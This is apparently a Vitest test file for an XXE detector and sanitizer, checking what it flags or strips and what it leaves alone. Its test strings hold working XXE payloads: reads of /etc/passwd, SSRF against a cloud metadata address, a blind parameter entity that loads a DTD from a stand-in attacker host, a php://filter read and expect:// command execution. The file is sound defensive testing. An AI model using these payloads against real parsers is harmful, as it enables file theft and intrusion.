/**
 * XXE (XML External Entity) Sanitizer Tests
 * Tests for src/sanitizers/xxe.ts
 */

import { describe, it, expect } from 'vitest';
import { sanitizeXxe, detectXxe } from '../../src/sanitizers/xxe';

describe('detectXxe', () => {
  describe('DOCTYPE declarations', () => {
    it('should detect basic DOCTYPE', () => {
      expect(detectXxe('<!DOCTYPE foo>')).toBe(true);
    });

    it('should detect DOCTYPE with entity', () => {
      expect(detectXxe('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')).toBe(true);
    });

    it('should detect case-insensitive DOCTYPE', () => {
      expect(detectXxe('<!doctype html>')).toBe(true);
    });
  });

  describe('ENTITY declarations', () => {
    it('should detect ENTITY with SYSTEM', () => {
      expect(detectXxe('<!ENTITY xxe SYSTEM "file:///etc/passwd">')).toBe(true);
    });

    it('should detect ENTITY with PUBLIC', () => {
      expect(detectXxe('<!ENTITY xxe PUBLIC "-//W3C//DTD" "http://example.com/evil.dtd">')).toBe(true);
    });

    it('should detect parameter entity', () => {
      expect(detectXxe('<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">')).toBe(true);
    });
  });

  describe('SYSTEM/PUBLIC references', () => {
    it('should detect SYSTEM with file protocol', () => {
      expect(detectXxe('SYSTEM "file:///etc/passwd"')).toBe(true);
    });

    it('should detect SYSTEM with http', () => {
      expect(detectXxe('SYSTEM "http://169.254.169.254/"')).toBe(true);
    });

    it('should detect PUBLIC with URI', () => {
      expect(detectXxe('PUBLIC "-//OASIS" "http://example.com"')).toBe(true);
    });
  });

  describe('Parameter entity references', () => {
    it('should detect %entity; reference', () => {
      expect(detectXxe('%xxe;')).toBe(true);
    });

    it('should detect % entity ; with spaces', () => {
      expect(detectXxe('% remote ;')).toBe(true);
    });
  });

  describe('CDATA sections', () => {
    it('should detect CDATA', () => {
      expect(detectXxe('<![CDATA[<script>alert(1)</script>]]>')).toBe(true);
    });
  });

  describe('Full XXE payloads', () => {
    it('should detect classic file read XXE', () => {
      const payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
      expect(detectXxe(payload)).toBe(true);
    });

    it('should detect SSRF via XXE', () => {
      const payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>';
      expect(detectXxe(payload)).toBe(true);
    });

    it('should detect blind XXE with parameter entity', () => {
      const payload = '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>';
      expect(detectXxe(payload)).toBe(true);
    });

    it('should detect XXE with PHP filter', () => {
      const payload = '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">';
      expect(detectXxe(payload)).toBe(true);
    });

    it('should detect XXE with expect protocol', () => {
      const payload = '<!ENTITY xxe SYSTEM "expect://id">';
      expect(detectXxe(payload)).toBe(true);
    });
  });

  describe('Safe inputs (no false positives)', () => {
    it('should not flag plain text', () => {
      expect(detectXxe('hello world')).toBe(false);
    });

    it('should not flag normal XML without entities', () => {
      expect(detectXxe('<root><item>value</item></root>')).toBe(false);
    });

    it('should not flag HTML', () => {
      expect(detectXxe('<div class="test">content</div>')).toBe(false);
    });

    it('should not flag XML processing instruction', () => {
      expect(detectXxe('<?xml version="1.0" encoding="UTF-8"?>')).toBe(false);
    });

    it('should not flag the word "system" in normal text', () => {
      expect(detectXxe('The system is running')).toBe(false);
    });

    it('should not flag percent signs in normal text', () => {
      expect(detectXxe('100% complete')).toBe(false);
    });

    it('should return false for non-string input', () => {
      expect(detectXxe(123 as any)).toBe(false);
      expect(detectXxe(null as any)).toBe(false);
    });
  });
});

describe('sanitizeXxe', () => {
  describe('Removes XXE constructs', () => {
    it('should remove DOCTYPE', () => {
      expect(sanitizeXxe('<!DOCTYPE foo><root/>')).toBe('<root/>');
    });

    it('should remove DOCTYPE with internal subset', () => {
      expect(sanitizeXxe('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root/>')).toBe('<root/>');
    });

    it('should remove ENTITY declarations', () => {
      expect(sanitizeXxe('<!ENTITY xxe SYSTEM "file:///etc/passwd">')).toBe('');
    });

    it('should remove CDATA sections', () => {
      expect(sanitizeXxe('before<![CDATA[evil]]>after')).toBe('beforeafter');
    });

    it('should remove multiple XXE constructs', () => {
      const input = '<!DOCTYPE a><!ENTITY b SYSTEM "x"><root/>';
      const result = sanitizeXxe(input);
      expect(result).toBe('<root/>');
    });

    it('should remove full XXE payload preserving body', () => {
      const input = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>test</name></user>';
      const result = sanitizeXxe(input);
      expect(result).toBe('<user><name>test</name></user>');
    });
  });

  describe('Preserves safe content', () => {
    it('should preserve normal XML', () => {
      const xml = '<root><item>value</item></root>';
      expect(sanitizeXxe(xml)).toBe(xml);
    });

    it('should preserve plain text', () => {
      expect(sanitizeXxe('hello world')).toBe('hello world');
    });

    it('should preserve XML with processing instruction', () => {
      const xml = '<?xml version="1.0"?><root/>';
      expect(sanitizeXxe(xml)).toBe(xml);
    });
  });

  describe('Threat collection', () => {
    it('should collect threats when requested', () => {
      const result = sanitizeXxe('<!DOCTYPE foo><root/>', true);
      expect(result.wasSanitized).toBe(true);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].type).toBe('xxe');
    });

    it('should report no threats for safe input', () => {
      const result = sanitizeXxe('<root/>', true);
      expect(result.wasSanitized).toBe(false);
      expect(result.threats).toHaveLength(0);
    });
  });

  describe('Edge cases', () => {
    it('should handle non-string input', () => {
      expect(sanitizeXxe(42 as any)).toBe('42');
    });

    it('should handle empty string', () => {
      expect(sanitizeXxe('')).toBe('');
    });
  });
});
